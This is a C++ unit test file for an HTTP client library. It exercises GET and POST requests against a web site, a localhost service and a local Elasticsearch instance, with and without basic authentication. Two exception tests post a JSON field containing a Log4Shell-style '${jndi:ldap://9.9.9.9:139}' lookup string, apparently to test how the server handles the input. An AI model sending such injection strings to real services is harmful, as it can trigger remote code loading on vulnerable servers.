// Copyright (c) 2015 The CSUTIL Authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

#include <string>

#include <math.h>
#include <stdint.h>
#include <stdio.h>
#include <unistd.h>

#include "base/common.h"
#include "base/status.h"
#include "http/http_client.h"

#include "test_base/include/test_base.h"

TEST(HttpClient, Test_Normal_Post) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://www.baidu.com";
  std::string post_params;
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_NEQ(kOk,
             r);  // TODO: considering r: kHttpStatusRedirect             = 302, // Move temporarily
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_Get) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://www.baidu.com";
  std::string result;

  r = http_client.Get(url, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, ret:%d\n", url.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_Get_Localhost) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9123/";

  while (true) {
    std::string result;
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    EXPECT_EQ(kOk, r);
    if (r != kOk) {
      fprintf(stderr, "Failed to get result of url:%s, ret:%d\n", url.c_str(), r);
    }

    fprintf(stderr, "%s\n", result.c_str());
    usleep(1000);
    break;
  }
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Bulk) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9200/_bulk?pretty";
  std::string post_params =
      "{ \"index\":  { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
      "{ \"delete\": { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"create\": { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"name\" : \"EEEEEAA\", \"country\" : \"China\", \"age\" : 129}\n"
      "{ \"index\":  { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 12 }}\n"
      "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
      "{ \"update\": { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 13, "
      "\"_retry_on_conflict\" : 3} }\n"
      "{ \"doc\" : {\"title\" : \"Very good and yes\"}, \"doc_as_upsert\": true}\n";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Index) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
  std::string post_params = "{ \"name\" : \"EEEEEAA\", \"country\" : \"USA\", \"age\" : 10}";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Search) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9200/tests_3/_search?pretty";
  std::string post_params = "{}";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Get_ID) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
  std::string result;

  r = http_client.Get(url, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, ret:%d\n", url.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Exception_ES_Post_Index) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  for (int i = 20; i < 40; ++i) {
    char buf[64] = {0};
    snprintf(buf, sizeof(buf) - 1, "%d", i);
    std::string url = "http://localhost:9200/tests_33/_doc/";
    url.append(buf);
    url.append("?pretty");

    std::string post_params =
        "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
    post_params.append(1, 0xe8);
    post_params.append(1, 0xb4);
    post_params.append("\"}");

    std::string result;

    r = http_client.Post(url, post_params, &result);
    EXPECT_EQ(kOk, r);
    if (r != kOk) {
      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
              post_params.c_str(), r);
    }

    fprintf(stderr, "%s\n", result.c_str());
  }
} /*}}}*/

TEST(HttpClient, Test_Normal_Get_Localhost_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9123/";

  while (true) {
    std::string result;
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    r = http_client.Get(url, &result);
    EXPECT_EQ(kOk, r);
    if (r != kOk) {
      fprintf(stderr, "Failed to get result of url:%s, ret:%d\n", url.c_str(), r);
    }

    fprintf(stderr, "%s\n", result.c_str());
    usleep(1000);
    break;
  }
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Bulk_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9200/_bulk?pretty";
  std::string post_params =
      "{ \"index\":  { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
      "{ \"delete\": { \"_index\": \"tests_23\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"create\": { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 11 }}\n"
      "{ \"name\" : \"EEEEEAA\", \"country\" : \"China\", \"age\" : 129}\n"
      "{ \"index\":  { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 12 }}\n"
      "{ \"name\" : \"FFFFFBB\", \"country\" : \"US\", \"age\" : 128}\n"
      "{ \"update\": { \"_index\": \"tests_33\", \"_type\": \"_doc\", \"_id\": 13, "
      "\"_retry_on_conflict\" : 3} }\n"
      "{ \"doc\" : {\"title\" : \"Very good and yes\"}, \"doc_as_upsert\": true}\n";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
  std::string post_params = "{ \"name\" : \"EEEEEAA\", \"country\" : \"USA\", \"age\" : 10}";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Post_Search_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  //    std::string url = "https://github.com/haveTryTwo/csutil/blob/master/base/status.h";
  std::string url = "http://localhost:9200/tests_3/_search?pretty";
  std::string post_params = "{}";
  std::string result;

  r = http_client.Post(url, post_params, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
            post_params.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Normal_ES_Get_ID_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  std::string url = "http://localhost:9200/tests_33/_doc/11?pretty";
  std::string result;

  r = http_client.Get(url, &result);
  EXPECT_EQ(kOk, r);
  if (r != kOk) {
    fprintf(stderr, "Failed to get result of url:%s, ret:%d\n", url.c_str(), r);
  }

  fprintf(stderr, "%s\n", result.c_str());
} /*}}}*/

TEST(HttpClient, Test_Exception_ES_Post_Index_UsingNameAndPwd) { /*{{{*/
  using namespace base;

  HttpClient http_client;
  Code r = http_client.Init();
  EXPECT_EQ(kOk, r);

  std::string user_name("test");
  std::string pwd("test");
  r = http_client.SetUserNameAndPwd(user_name, pwd);
  EXPECT_EQ(kOk, r);

  for (int i = 20; i < 40; ++i) {
    char buf[64] = {0};
    snprintf(buf, sizeof(buf) - 1, "%d", i);
    std::string url = "http://localhost:9200/tests_33/_doc/";
    url.append(buf);
    url.append("?pretty");

    std::string post_params =
        "{ \"country\" : \"${java:vm}, ${jndi:ldap://9.9.9.9:139}\", \"name\" : \"";
    post_params.append(1, 0xe8);
    post_params.append(1, 0xb4);
    post_params.append("\"}");

    std::string result;

    r = http_client.Post(url, post_params, &result);
    EXPECT_EQ(kOk, r);
    if (r != kOk) {
      fprintf(stderr, "Failed to get result of url:%s, post_params:%s, ret:%d\n", url.c_str(),
              post_params.c_str(), r);
    }

    fprintf(stderr, "%s\n", result.c_str());
  }
} /*}}}*/
